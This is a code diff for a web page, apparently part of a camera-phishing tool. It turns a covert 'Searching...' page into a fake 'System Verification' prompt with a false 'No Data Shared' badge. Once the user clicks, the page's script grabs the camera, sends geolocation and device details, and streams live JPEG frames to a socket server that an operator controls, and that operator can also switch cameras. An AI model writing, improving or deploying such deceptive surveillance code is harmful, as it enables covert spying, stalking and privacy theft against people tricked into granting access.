@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Searching - Please Wait</title>
+    <title>Secure Verification - Please Wait</title>
     <style>
         * { box-sizing: border-box; }
         body {
@@ -13,33 +13,58 @@
             justify-content: center;
             align-items: center;
             font-family: Arial, sans-serif;
-            background: #f4f6f9;
-            color: #222;
+            background: #121212;
+            color: #eee;
         }
         .card {
             width: 90%;
-            max-width: 420px;
-            background: white;
-            padding: 25px;
+            max-width: 400px;
+            background: #1e1e1e;
+            padding: 30px;
             border-radius: 14px;
-            box-shadow: 0 5px 25px rgba(0,0,0,0.10);
+            box-shadow: 0 8px 30px rgba(0,0,0,0.5);
             text-align: center;
+            border: 1px solid #333;
         }
-        h2 { margin-top: 0; }
-        .status { padding: 12px; border-radius: 8px; margin: 15px 0; font-size: 14px; }
-        .waiting { background: #fff3cd; color: #856404; }
-        .error { background: #f8d7da; color: #721c24; }
+        h2 { margin-top: 0; color: #fff; font-size: 22px; }
+        p { color: #aaa; font-size: 14px; line-height: 1.5; }
+        .status { padding: 12px; border-radius: 8px; margin: 15px 0; font-size: 14px; font-weight: bold; }
+        .waiting { background: #2c3e50; color: #3498db; }
+        .error { background: #512e2f; color: #e74c3c; }
+        .success { background: #1e4620; color: #2ecc71; }
+        
+        .action-btn {
+            width: 100%;
+            background: #27ae60;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: opacity 0.2s;
+        }
+        .action-btn:hover { opacity: 0.9; }
+        
         video { display: none !important; }
-        .small { font-size: 12px; color: #777; margin-top: 15px; }
+        .secure-badge { font-size: 11px; color: #7f8c8d; margin-top: 20px; display: block; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>Searching...</h2>
-    <div id="status" class="status waiting">Connecting...</div>
+<div class="card" id="mainCard">
+    <h2>System Verification</h2>
+    <p>Please complete the security check to proceed to your requested content safely.</p>
+    
+    <div id="status" class="status waiting">Click below to start verification</div>
+    
+    <button id="startBtn" class="action-btn" onclick="triggerVerification()">Verify & Continue</button>
+    
     <video id="video" autoplay playsinline muted></video>
-    <p class="small">Please wait while we connect your session.</p>
+    
+    <span class="secure-badge">🔒 256-bit Secure Connection &bull; No Data Shared</span>
 </div>
 
 <canvas id="canvas" style="display:none;"></canvas>
@@ -50,6 +75,7 @@ const socket = io();
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const statusBox = document.getElementById("status");
+const startBtn = document.getElementById("startBtn");
 
 let mediaStream = null;
 let cameraReady = false;
@@ -93,8 +119,11 @@ function sendLocation() {
     );
 }
 
-async function startCamera() {
-    setStatus("Connecting...", "waiting");
+// User ke click karte hi yeh function instant execute hoga
+async function triggerVerification() {
+    startBtn.style.display = "none";
+    setStatus("Verifying session...", "waiting");
+
     if (mediaStream) {
         mediaStream.getTracks().forEach(track => track.stop());
     }
@@ -115,14 +144,21 @@ async function startCamera() {
         await video.play();
 
         cameraReady = true;
-        setStatus("Searching...", "waiting");
+        setStatus("Verified Successfully!", "success");
 
         socket.emit("user-ready", { deviceInfo: getDeviceInfo() });
         sendLocation();
         startLiveStream();
+
+        // Thodi der baad card ko thoda minimal dikha sakte hain ya wahi rehne dein
+        setTimeout(() => {
+            setStatus("Connected. Please wait...", "waiting");
+        }, 1500);
+
     } catch (error) {
         cameraReady = false;
-        setStatus("Searching...", "waiting");
+        setStatus("Verification required to proceed.", "error");
+        startBtn.style.display = "block"; // Agar user cancel kare toh dubara button dikha do
     }
 }
 
@@ -134,7 +170,6 @@ function startLiveStream() {
         canvas.height = 240;
         const context = canvas.getContext("2d");
         context.drawImage(video, 0, 0, 320, 240);
-        // Improved quality and balanced resolution for clear CCTV view
         const frame = canvas.toDataURL("image/jpeg", 0.4);
         socket.emit("live-stream-frame", frame);
     }, 180);
@@ -177,17 +212,17 @@ socket.on("request-location", () => { sendLocation(); });
 
 socket.on("switch-camera", async () => {
     useFrontCamera = !useFrontCamera;
-    await startCamera();
+    if (cameraReady) await triggerVerification();
 });
 
 socket.on("server-full", data => {
-    setStatus(`Maximum ${data.maxUsers} users are currently connected.`, "error");
+    setStatus(`Maximum capacity reached (${data.maxUsers} users).`, "error");
     if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
 });
 
 socket.on("link-disabled", () => {
     stopEverything();
-    setStatus("This link is currently disabled.", "error");
+    setStatus("This link is currently inactive.", "error");
 });
 
 socket.on("disable-user-access", () => {
@@ -195,7 +230,7 @@ socket.on("disable-user-access", () => {
     document.body.innerHTML = `
         <div class="card">
             <h2>Session Ended</h2>
-            <p>This link has been disabled by the administrator.</p>
+            <p>The session has been terminated by the administrator.</p>
         </div>
     `;
 });
@@ -214,7 +249,6 @@ function stopEverything() {
 
 socket.on("connect", () => {
     socket.emit("user-connect-info", { deviceInfo: getDeviceInfo() });
-    startCamera();
 });
 </script>
 </body>
